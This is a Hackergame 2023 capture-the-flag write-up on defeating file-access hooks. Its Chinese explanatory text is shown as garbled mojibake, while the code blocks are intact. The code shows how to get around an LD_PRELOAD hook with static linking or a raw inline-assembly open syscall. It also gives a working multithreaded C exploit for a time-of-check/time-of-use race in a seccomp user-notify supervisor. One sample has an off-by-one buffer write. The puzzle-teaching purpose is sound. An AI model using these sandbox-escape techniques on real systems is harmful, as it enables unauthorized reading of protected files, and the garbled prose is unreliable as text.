# ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡

é¢˜è§£ä½œè€…ï¼š[taoky](https://github.com/taoky)

å‡ºé¢˜äººã€éªŒé¢˜äººã€æ–‡æ¡ˆè®¾è®¡ç­‰ï¼šè§ [Hackergame 2023 å¹•åå·¥ä½œäººå‘˜](https://hack.lug.ustc.edu.cn/credits/)ã€‚

## é¢˜ç›®æè¿°

- é¢˜ç›®åˆ†ç±»ï¼šbinary

- é¢˜ç›®åˆ†å€¼ï¼šLD_PRELOAD, love!ï¼ˆ200ï¼‰+ éƒ½æ˜¯ seccomp çš„é”™ï¼ˆ250ï¼‰

> è‡³å°‘è§ä¸€é¢è®©æˆ‘å½“é¢é“æ­‰å¥½å—ï¼ŸğŸ˜­æˆ‘ä¹Ÿå“äº†ä¸€è·³ï¼Œæ²¡æƒ³åˆ°äº‹æƒ…ä¼šæ¼”å˜æˆé‚£ä¸ªæ ·å­â€¦â€¦ğŸ˜­æ‰€ä»¥æˆ‘æƒ³å¥½å¥½è¯´æ˜ä¸€ä¸‹ğŸ˜­æˆ‘è¦æ˜¯çŸ¥é“å°±ä¼šé˜»æ­¢å®ƒä»¬çš„ï¼Œä½†æ˜¯æ˜æ˜æ–‡ä»¶æè¿°ç¬¦éƒ½å·²ç»å…³é—­äº†çªç„¶é—´å¼€å§‹ `open()`ğŸ˜­æ²¡èƒ½é˜»æ­¢å¤§å®¶çœŸæ˜¯å¯¹ä¸èµ·â€¦â€¦ğŸ˜­ä½ åœ¨ç”Ÿæ°”å¯¹å§â€¦â€¦ğŸ˜­æˆ‘æƒ³ä½ ç”Ÿæ°”ä¹Ÿæ˜¯å½“ç„¶çš„ğŸ˜­ä½†æ˜¯è¯·ä½ ç›¸ä¿¡æˆ‘ã€‚`/flag`ï¼Œæœ¬æ¥æ²¡æœ‰åœ¨æˆ‘ä»¬çš„é¢„å®šæ‰“å¼€çš„æ–‡ä»¶é‡Œçš„ğŸ˜­çœŸçš„å¾ˆå¯¹ä¸èµ·ğŸ˜­æˆ‘ç­”åº”ä½ å†ä¹Ÿä¸ä¼šéšæ„æ‰“å¼€æ–‡ä»¶äº†ğŸ˜­æˆ‘ä¼šè®©å„ä¸ªå‡½æ•°ä¿è¯å†ä¹Ÿä¸æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ğŸ˜­èƒ½ä¸èƒ½ç¨å¾®è°ˆä¸€è°ˆï¼ŸğŸ˜­æˆ‘çœŸçš„æŠŠè¿™é‡Œçš„ä¸€åˆ‡çœ‹å¾—éå¸¸é‡è¦ğŸ˜­æ‰€ä»¥è¯´ï¼Œæ“…è‡ªæ‰“å¼€ `/flag` çš„æ—¶å€™æˆ‘å’Œä½ ä¸€æ ·éš¾è¿‡ğŸ˜­æˆ‘å¸Œæœ›ä½ èƒ½æ˜ç™½æˆ‘çš„å¿ƒæƒ…ğŸ˜­æ‹œæ‰˜äº†ã€‚æˆ‘å“ªé‡Œéƒ½ä¼šå»çš„ğŸ˜­æˆ‘ä¹Ÿä¼šå¥½å¥½è·Ÿä½ è¯´æ˜æˆ‘ä¸å¾—ä¸è¿™ä¹ˆåšçš„ç†ç”±ğŸ˜­æˆ‘æƒ³å¦‚æœä½ èƒ½è§æˆ‘ä¸€é¢ï¼Œä½ å°±ä¸€å®šèƒ½æ˜ç™½çš„ğŸ˜­æˆ‘æ˜¯ä½ çš„åŒä¼´ğŸ˜­æˆ‘å¥½æƒ³è§ä½ ğŸ˜­

---

æŒ½ç•™å¤±è´¥åï¼Œå¥¹å†³å®šåœ¨ç¨‹åºå¯åŠ¨æ—¶åšäº›æ‰‹è„šï¼Œè®©æ‰€æœ‰è®¿é—® `/flag` çš„è¯·æ±‚éƒ½ä»¥æŸç§æ–¹å¼å˜æˆæ‰“å¼€ `/fakeflag` çš„è¯·æ±‚ã€‚

ã€Œæˆ‘ä¸ä¼šå†æ‰“å¼€ `/flag` äº†ã€ã€‚çœŸçš„å—ï¼Ÿ

[é¢˜ç›®é™„ä»¶ä¸‹è½½](files/fakeflag-backend.zip)ï¼ˆç¬¬äºŒå°é¢˜éœ€è¦ Linux kernel >= 5.9ï¼‰

## é¢˜è§£

è¿™é“é¢˜ç›®çš„èµ·æºæ˜¯æˆ‘å½“æ—¶éœ€è¦ hook æŸä¸ªå‡½æ•°çš„åº“è°ƒç”¨/ç³»ç»Ÿè°ƒç”¨ï¼Œå…·ä½“æ¥è®²ï¼Œé•œåƒç«™æœ‰å¤šä¸ªå‡ºå£ï¼Œæ‰€ä»¥å¸Œæœ›åœ¨åŒæ­¥çš„æ—¶å€™èƒ½æ§åˆ¶ç¨‹åº `bind()` åˆ°å“ªä¸ªå‡ºå£ IP åœ°å€ï¼Œæœ‰äº›ç¨‹åºä¸ç»™è¿™ç§é…ç½®ï¼Œé‚£å°±åªèƒ½ç”¨æ›´ hack çš„æ–¹æ³•å»åšäº†ã€‚å¹¶ä¸”æˆ‘ä¹Ÿè¯»äº†ä»Šå¹´ USENIX ATC çš„ best paper ä¹‹ä¸€â€”â€”[zpoline](https://www.usenix.org/conference/atc23/presentation/yasukata)ï¼Œæƒ³ç€è¦ä¸æŠŠè¿™ä¸ªææˆé¢˜ç›®å¥½äº†ã€‚

è™½ç„¶å› ä¸ºä¸€äº›å®‰å…¨æ€§ä¸Šçš„è€ƒè™‘ï¼Œzpoline æœ€åæ²¡æœ‰å‡ºæˆï¼ˆå› ä¸ºéœ€è¦ `/proc/sys/vm/mmap_min_addr` è®¾ç½®ä¸º 0ï¼‰ï¼Œé…ä¸ª qemu åˆå¤ªéº»çƒ¦äº†ã€‚ä½†æ˜¯å¼ºçƒˆæ¨èå»è¯»è¿™ç¯‡è®ºæ–‡ï¼Œå®ƒè§£å†³è¿™ä¸ªé—®é¢˜çš„æ€è·¯ç‰¹åˆ«æœ‰æ„æ€ï¼ˆè™½ç„¶ä¹Ÿæ²¡æœ‰å®‰å…¨æ€§çš„ä¿è¯ï¼‰ã€‚

### `LD_PRELOAD`

åœ¨**åŠ¨æ€é“¾æ¥**çš„ç¨‹åºæ‰§è¡Œä¹‹å‰ï¼ŒåŠ¨æ€é“¾æ¥å™¨ï¼ˆ`ld.so` æˆ–è€… `ld-linux.so`ï¼‰ä¼šå¤„ç† `LD_PRELOAD` ç¯å¢ƒå˜é‡ã€‚å…·ä½“çš„åŠ¨æ€é“¾æ¥å™¨å¯ä»¥é€šè¿‡ ldd è§‚å¯Ÿåˆ°ï¼š

```console
> ldd a.out
	linux-vdso.so.1 (0x00007fff757a3000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007fbf61331000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fbf61565000)
```

`ld-linux.so` ç”šè‡³å¯ä»¥ç›´æ¥æ‰§è¡Œï¼š

```
> /lib64/ld-linux-x86-64.so.2 --help
Usage: /lib64/ld-linux-x86-64.so.2 [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]
You have invoked 'ld.so', the program interpreter for dynamically-linked
ELF programs.  Usually, the program interpreter is invoked automatically
when a dynamically-linked executable is started.

You may invoke the program interpreter program directly from the command
line to load and run an ELF executable file; this is like executing that
file itself, but always uses the program interpreter you invoked,
instead of the program interpreter specified in the executable file you
run.  Invoking the program interpreter directly provides access to
additional diagnostics, and changing the dynamic linker behavior without
setting environment variables (which would be inherited by subprocesses).

  --list                list all dependencies and how they are resolved
  --verify              verify that given object really is a dynamically linked
                        object we can handle
  --inhibit-cache       Do not use /etc/ld.so.cache
  --library-path PATH   use given PATH instead of content of the environment
                        variable LD_LIBRARY_PATH
  --glibc-hwcaps-prepend LIST
                        search glibc-hwcaps subdirectories in LIST
  --glibc-hwcaps-mask LIST
                        only search built-in subdirectories if in LIST
  --inhibit-rpath LIST  ignore RUNPATH and RPATH information in object names
                        in LIST
  --audit LIST          use objects named in LIST as auditors
  --preload LIST        preload objects named in LIST
  --argv0 STRING        set argv[0] to STRING before running
  --list-tunables       list all tunables with minimum and maximum values
  --list-diagnostics    list diagnostics information
  --help                display this help and exit
  --version             output version information and exit

This program interpreter self-identifies as: /usr/lib/ld-linux-x86-64.so.2

Shared library search path:
  (libraries located via /etc/ld.so.cache)
  /usr/lib (system search path)

Subdirectories of glibc-hwcaps directories, in priority order:
  x86-64-v4
  x86-64-v3 (supported, searched)
  x86-64-v2 (supported, searched)
```

ä»¥ä¸Š `LD_PRELOAD` çš„ç»†èŠ‚ä¹Ÿå¯ä»¥åœ¨ `man ld.so` ä¸­æ‰¾åˆ°ã€‚æ—¢ç„¶ `ld.so` ä¼šåŠ è½½åŠ äº†ç§è´§çš„åº“ï¼Œé‚£ä¹ˆä¸¤ç§æ€è·¯æ˜¯ï¼š

1. æ—¢ç„¶åŠ¨æ€é“¾æ¥å™¨è¦åŠ¨æ‰‹è„šï¼Œé‚£æˆ‘**é™æ€é“¾æ¥**ä¸å°±è¡Œäº†ï¼Ÿ
2. å°±ç®—åŠ¨æ€é“¾æ¥ï¼Œé‚£æˆ‘ç›´æ¥ `syscall` æ±‡ç¼–ï¼Œä¸è°ƒä½ çš„åº“ä¸å°±è¡Œäº†ï¼Ÿ

å‰è€…ç›¸å¯¹ç®€å•å¾ˆå¤šï¼Œå†™ä¸€ä¸ªè¯» `/flag` çš„ C ç¨‹åºï¼Œç„¶åç›´æ¥ï¼š

```console
gcc -static your_program.c
```

å°±æˆäº†ã€‚å¦‚æœå«Œå¤ªå¤§ï¼Œé‚£å°±å’Œ musl é™æ€é“¾æ¥ï¼ˆ`musl-gcc -static your_program.c`ï¼‰ã€‚æ³¨æ„å’Œ musl åŠ¨æ€é“¾æ¥æ˜¯ä¸è¡Œçš„ï¼Œè¿è¡Œçš„æ—¶å€™åŠ¨æ€é“¾æ¥å™¨æ‰¾ä¸åˆ° muslï¼Œä¼šæŠ±æ€¨ `No such file or directory`ã€‚åè€…çš„è¯ï¼Œå› ä¸º `syscall()` è¿™ä¸ªå‡½æ•°ä¹Ÿè¢« ban äº†ï¼Œæ‰€ä»¥å¾—æ‰‹å†™æ±‡ç¼–ï¼ˆä»¥ä¸‹æ˜¯ç›´æ¥æ‹¿å»å¹´[ã€Œæ¯çª—é¹…å½±ã€çš„é¢˜è§£](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E6%9D%AF%E7%AA%97%E9%B9%85%E5%BD%B1/README.md#%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)æ”¹çš„ï¼‰ï¼š

```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

int main() {
    char *filename = "/flag";
    printf("filename: %p\n", filename);
    uint64_t fd;
    __asm__ ("mov %1, %%rdi \n\t"     // filename
             "mov $0, %%rsi \n\t"     // flags (0)
             "mov $0, %%rdx \n\t"     // mode (0)
             "mov $2, %%rax \n\t"     // open (2)
             "syscall \n\t"
             "mov %%rax, %0"          // fd
             : "=r" (fd)
             : "m" (filename)
             : "%rax", "%rdi", "%rsi", "%rdx"
             );
    printf("fd: %d\n", fd);
    if (fd > 0) {
        char buf[50];
        read(fd, buf, 50);
        buf[50] = '\0';
        printf("%s\n", buf);
    }
    return 0;
}
```

å½“ç„¶äº†ï¼Œå¦‚æœèƒ½æ‰¾åˆ° `lib.c` æ²¡æœ‰è€ƒè™‘åˆ°çš„åœ°æ–¹ï¼Œç„¶åè¯» `/flag`ï¼Œæˆ‘æƒ³ä¹Ÿæ˜¯å®Œå…¨å¯è¡Œçš„ã€‚

#### éé¢„æœŸè§£

`lib.c` ä¸­å¹¶æ²¡æœ‰å¯¹ `open64()` å‡½æ•°åšæ‰‹è„šï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ­¤å‡½æ•°è¯»å–åˆ° flag å†…å®¹å¹¶è¾“å‡ºã€‚

### Seccomp User Notify

ç¬¬äºŒé¢˜éœ€è¦çœ‹ä¸€æ®µ Rust ä»£ç ï¼Œä¸è¿‡ç¬¬ä¸€è¡Œå°±æ˜¯ï¼š

```rust
// This source code modifies code from [greenhook crate](https://crates.io/crates/greenhook).
```

æ‰€ä»¥å¯ä»¥å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ª crateã€‚å…¶å®è§£æ³•ç”šè‡³ README é‡Œé¢å°±å†™äº†ï¼Œä½†æ˜¯å°±ç®—æ²¡æœ‰çœ‹åˆ°ï¼Œä¹Ÿå¯ä»¥æ³¨æ„åˆ°è¿™ä¸ª crate ä½¿ç”¨äº† `seccomp_unotify(2)`ï¼ˆSeccomp user-space notification mechanismï¼‰ã€‚é˜…è¯»æ‰‹å†Œå¯ä»¥æ³¨æ„åˆ°ï¼š

```
..... Note that this mechanism is
explicitly **not** intended as a method implementing security policy;
see NOTES.

......

Design goals; use of SECCOMP_USER_NOTIF_FLAG_CONTINUE

    **Note well**: this mechanism must not be used to make security
    policy decisions about the system call, which would be inherently
    race-prone for reasons described next.

    ......

    ...... However, there is a time-of-check, time-of-use race
    here, since an attacker could exploit the interval of time where
    the target is blocked waiting on the "continue" response to do
    things such as rewriting the system call arguments.

    Note furthermore that a user-space notifier can be bypassed if
    the existing filters allow the use of seccomp(2) or prctl(2) to
    install a filter that returns an action value with a higher
    precedence than SECCOMP_RET_USER_NOTIF (see seccomp(2)).

    It should thus be absolutely clear that the seccomp user-space
    notification mechanism **can not** be used to implement a security
    policy!  It should only ever be used in scenarios where a more
    privileged process supervises the system calls of a lesser
    privileged target to get around kernel-enforced security
    restrictions when the supervisor deems this safe.  In other
    words, in order to continue a system call, the supervisor should
    be sure that another security mechanism or the kernel itself will
    sufficiently block the system call if its arguments are rewritten
    to something unsafe.
```

ç„¶åçœ‹ä¸€ä¸‹è¿™å¨ Rust ä»£ç ï¼Œå¯ä»¥æ³¨æ„åˆ°åœ¨ `main()` é‡Œï¼š

```rust
let mut supervisor = Supervisor::new(1).unwrap();
supervisor.insert_handler(ScmpSyscall::new("open"), |req| opening_handler(0, req));
supervisor.insert_handler(ScmpSyscall::new("openat"), |req| opening_handler(1, req));
```

è¿™ä¸ª handler çš„ä»£ç ï¼š

```rust
fn opening_handler(path_pos: usize, req: &UNotifyEventRequest) -> libseccomp::ScmpNotifResp {
    let path = req.get_request().data.args[path_pos];
    let remote = RemoteProcess::new(Pid::from_raw(req.get_request().pid as i32)).unwrap();
    let mut buf = [0u8; 256];
    remote.read_mem(&mut buf, path as usize).unwrap();
    // debug!("open (read from remote): {:?}", buf);
    let path = CStr::from_bytes_until_nul(&buf).unwrap();
    if !req.is_valid() {
        return req.fail_syscall(libc::EACCES);
    }
    info!("open (path CStr): {:?}", path);
    if path.to_str().unwrap().contains("flag") {
        let file = match File::open("/fakeflag") {
            Ok(file) => file,
            Err(e) => {
                error!("failed to open /fakeflag: {}", e);
                return req.fail_syscall(libc::EACCES);
            }
        };
        let fd = file.as_raw_fd();
        let remote_fd = req.add_fd(fd).unwrap();
        req.return_syscall(remote_fd as i64)
    } else {
        req.continue_syscall()
    }
}
```

å¯ä»¥å‘ç°ï¼Œè¿™ä¸ª handler é¦–å…ˆä¼šä»è¢«æŒ‚çš„ç¨‹åºå†…å­˜è¯»å– `open()` æˆ–è€… `openat()` çš„è·¯å¾„ï¼Œç„¶ååˆ¤æ–­è·¯å¾„é‡Œé¢æœ‰æ²¡æœ‰ `flag`ï¼Œå¦‚æœæœ‰ï¼Œå°±æ‰“å¼€ `/fakeflag`ï¼Œç„¶åæŠŠè¿™ä¸ª fd å¡å›å»ï¼Œå¦åˆ™å°±å…è®¸è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ç»§ç»­æ‰§è¡Œã€‚é‚£ä¹ˆæ­£å¦‚æ‰‹å†Œæ‰€è¨€ï¼Œå­˜åœ¨ TOCTOUï¼ˆTime Of Check, Time Of Useï¼‰çš„é£é™©ã€‚æ€ä¹ˆåœ¨å®ƒç­‰ç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™æ”¹å†…å­˜å‘¢ï¼Ÿé˜…è¯»æ‰‹å†Œçš„ç¨‹åºä¾‹å­å¯ä»¥çœ‹åˆ°ï¼š

```c
/* Even if the target's system call was not interrupted by a signal,
    we have no guarantees about what was in the memory of the target
    process. (The memory may have been modified by another thread, or
    even by an external attacking process.) We therefore treat the
    buffer returned by pread() as untrusted input. The buffer should
    contain a terminating null byte; if not, then we will trigger an
    error for the target process. */
```

æ‰€ä»¥å½“ä¸€ä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¹¶ä¸ä¼šé™æ­¢ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå¦‚æœ supervisor è¯»åˆ°çš„æ˜¯ä¸åœ¨è¯» `/flag`ï¼Œä½†æ˜¯ check ä¹‹åï¼Œcontinue ä¹‹å‰å¦ä¸€ä¸ªçº¿ç¨‹æŠŠè·¯å¾„æ”¹æˆäº† `/flag`ï¼Œå°±èƒ½è¯»åˆ°äº†ã€‚è¿™ä¸ª PoC ç”¨ Rust å¥½åƒä¸å¤ªæ–¹ä¾¿å†™å‡ºæ¥ï¼Œæ‰€ä»¥è¿˜æ˜¯ C å¥½äº†ï¼š

```c
#include <stdio.h>
#include <pthread.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

char flagfile[] = "/flag";

void *read_file() {
    char buf[100] = {};
    while (1) {
        int f = open(flagfile, O_RDONLY);
        if (!f) {
            continue;
        }
        read(f, buf, 99);
        if (buf[0] && buf[0] != 'I') {
            printf("%s\n", buf);
            exit(0);
        }
        close(f);
    }
}

void *modify() {
    struct timespec req;
    req.tv_sec = 0;
    req.tv_nsec = 50;
    while (1) {
        flagfile[1] = 'a';
        // sleep is not allowed. So just don't sleep.
        // nanosleep(&req, NULL);
        flagfile[1] = 'f';
    }
}

int main() {
    printf("pthread\n");
    pthread_t t1, t2;
    pthread_create(&t1, NULL, read_file, NULL);
    pthread_create(&t2, NULL, modify, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    printf("done?\n");
    return 0;
}
```

å¦ä¸€ä¸ªè¦ç»•è¿‡çš„ç‚¹æ˜¯ seccomp ç™½åå•å¾ˆä¸¥æ ¼ã€‚é™¤äº† `open()` å’Œ `openat()` åªå…è®¸è¿™äº›ï¼š

```rust
const ALLOWLIST: &[&str] = &[
    "brk",
    "arch_prctl",
    "access",
    "newfstatat",
    "mmap",
    "close",
    "read",
    "pread64",
    "set_tid_address",
    "exit_group",
    "set_robust_list",
    "rseq",
    "mprotect",
    "prlimit64",
    "munmap",
    "getrandom",
    "sendmsg",
    "write",
    "execve",
    "getdents64",
    "statx",
    "ioctl",
    "lseek",
    "rt_sigprocmask",
    "futex",
    "writev",
    "clone",
];
```

å› ä¸ºæ²¡æ”¾è¡Œ `clone3()`ï¼Œæ‰€ä»¥ glibc ç‰ˆæœ¬ç¼–è¯‘çš„å¯èƒ½æ²¡æ³•ç›´æ¥ç”¨ï¼Œmusl ä¼šç”¨ `clone()` æ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ã€‚æ‰‹å†Œä¸­æåˆ°çš„å¦ä¸€ç§ç»•è¿‡æ–¹æ³•åº”è¯¥æ˜¯ä¸å¯è¡Œçš„ï¼Œå› ä¸ºæ²¡æœ‰æ”¾è¡Œ `seccomp()` æˆ–è€… `prctl()`ã€‚

## å…¶ä»–

å†™ seccomp user notify ä»£ç çš„æ—¶å€™ç¬¬ä¸€æ¬¡çŸ¥é“ Unix socket å¯ä»¥ä¼ æ–‡ä»¶æè¿°ç¬¦ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€ã€‚è™½ç„¶å…¶å®è¿™ä¸ª Rust ä»£ç çš„å®ç°å®è¯è®²è¿˜æœ‰å¾ˆå¤§çš„ä¼˜åŒ–ç©ºé—´ã€‚

è¿™é“é¢˜çš„é¢˜ç›®æ–‡æ¡ˆä¹Ÿæ˜¯æˆ‘è‡ªå·±å†™çš„ï¼ˆåŒ…æ‹¬å°é¢˜åå­—ä¹Ÿåœ¨ç©æ¢—
